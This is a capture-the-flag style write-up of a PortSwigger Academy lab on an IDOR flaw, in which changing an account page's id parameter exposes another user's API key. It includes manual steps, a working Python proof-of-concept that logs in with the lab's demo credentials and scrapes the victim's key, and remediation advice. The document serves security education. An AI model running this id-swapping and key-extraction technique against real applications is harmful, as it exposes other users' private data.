# IDOR — Accessing Another User's Data via Modified ID Parameter — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-07-31

## The Problem

The user's account/profile page took an `id` parameter directly from the request (e.g. `/my-account?id=wiener`) and used it to decide whose data to return — without checking whether the currently logged-in user was actually authorized to view that specific `id`. This is a classic **Insecure Direct Object Reference (IDOR)**: the server trusted a client-supplied identifier as-is, instead of verifying it against the authenticated user's own identity.

## Discovery / Exploitation

1. Log in as a normal user (`wiener` / `peter`) and note the account page URL, which includes an `id` parameter referencing the logged-in user (e.g. `/my-account?id=wiener`)
2. Change the `id` value to another known username (e.g. `/my-account?id=carlos`)
3. The server returns `carlos`'s account data — including a sensitive value (their private API key) — despite the request still being authenticated as `wiener`, not `carlos`

## Impact

Any authenticated user can view another user's private data (in this case, an API key) simply by changing an identifier in the request. Depending on what the `id` parameter controls elsewhere in the application, this pattern can extend to reading, modifying, or deleting other users' data entirely.

## Proof of Concept (Python)

This script logs in as the low-privileged user (`wiener`), then requests another user's (`carlos`) account page by changing the `id` parameter, and extracts their leaked API key from the response.

```python
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_api_key(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) logging in as wiener user")
    data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text

    if "logout" in res:
        print("(+) login successful")

        carlos_url = url + "/my-account?id=carlos"
        r = s.get(carlos_url, verify=False, proxies=proxies)
        res = r.text

        if "carlos" in res:
            print("(+) successfully accessed carlos's account")
            print("(+) retrieving API key")

            match = re.search(r"your api key is: (.*?)<", res)
            if match:
                api_key = match.group(1)
                print("(+) your API KEY is: " + api_key)
            else:
                print("(-) could not find API key in the response")
                sys.exit(-1)
        else:
            print("(-) could not access carlos's account")
            sys.exit(-1)
    else:
        print("(-) failed to log in")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    carlos_api_key(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Fetches the login page and extracts the CSRF token required to submit the login form
2. Logs in as the normal user (`wiener`) using a session so cookies persist across requests
3. Confirms login succeeded by checking for "logout" in the response
4. Requests the account page with `id=carlos` instead of the logged-in user's own id
5. Extracts the leaked API key from the response using a regex match on the surrounding text

## Remediation

The server must never rely solely on a client-supplied identifier to decide whose data to return. On every request, it should:
1. Identify the actual authenticated user from their session (not from the `id` parameter)
2. Verify that the requested `id` matches the authenticated user's own identity, or that the authenticated user has explicit permission to access that other record
3. Reject the request (e.g. `403 Forbidden`) if the check fails — regardless of what `id` value was supplied
